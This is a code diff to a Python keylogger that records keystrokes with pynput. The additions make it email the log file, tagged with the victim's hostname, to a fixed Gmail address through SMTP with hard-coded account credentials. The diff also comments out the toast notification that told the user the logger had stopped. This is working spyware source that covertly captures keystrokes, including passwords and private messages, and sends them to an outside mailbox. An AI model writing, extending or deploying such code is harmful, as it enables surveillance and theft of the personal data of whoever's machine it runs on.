@@ -1,13 +1,48 @@
 from pynput.keyboard import Key, Listener
 from datetime import datetime
+import smtplib
+from os.path import basename
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
+import socket
 from win10toast import ToastNotifier
 
-'''NOTE: PRESS CTRL + F12 TO STOP KEYLOGGER'''
+EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [LCTRL] + [F12] to stop keylogger
+PORT = 465                                  # Specify port number here (465 or 587 recommended)
+SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server here
+TO_ADDR = "mail.smtpy@gmail.com"            # Specify recipient email address
+FROM_ADDR = "mail.smtpy@gmail.com"          # Specify sender email address
+PASSWORD = "PythonMail1!"                   # Specify sender email account password
+HOSTNAME = socket.gethostname()
+SUBJECT = HOSTNAME + " // keylogger.py"     # Specify email subject
+CONTENT = "see kelog.txt attached"          # Specify email body
+active_keys = set()
 
 def log(text):
     with open("keylog.txt", "a") as f:
         f.write(str(text))
         f.close()
+        
+def email_log():
+    msg = MIMEMultipart()
+    msg["To"] = TO_ADDR
+    msg["From"] = FROM_ADDR
+    msg["Subject"] = SUBJECT
+    body = MIMEText(CONTENT, "plain")
+    msg.attach(body)
+    
+    file = "keylog.txt"
+    with open(file, "r") as f:
+        attachment = MIMEApplication(f.read(), Name = basename(file))
+        attachment["Content-Disposition"] = "attachment"; file = "{}".format(basename(file))
+    msg.attach(attachment)
+    
+    server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)
+    server.login(FROM_ADDR, PASSWORD)
+    server.send_message(msg, from_addr = FROM_ADDR, to_addrs = [TO_ADDR])
+    print("Email Sent to ", TO_ADDR)
+    server.quit()
 
 def on_press(key):
     if key in EXIT_COMBINATION:
@@ -35,8 +70,9 @@ def on_press(key):
 def on_release(key):
     pass
 
-EXIT_COMBINATION = {Key.ctrl_l, Key.f12}
-active_keys = set()
+# Clear previous log
+with open("keylog.txt", "w") as f:
+    f.close()
 
 start_date = datetime.now()
 start_minute = str(start_date.minute)
@@ -59,4 +95,7 @@ log("-----------------------------\n")
 log(f"End Time: {end_date.hour}:{end_minute} {end_date.month}/{end_date.day}/{end_date.year}\n")
 log("-----------------------------\n")
 
-ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)
+'''Windows 10 notification when keylogger is stopped.'''
+# ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)
+
+email_log()
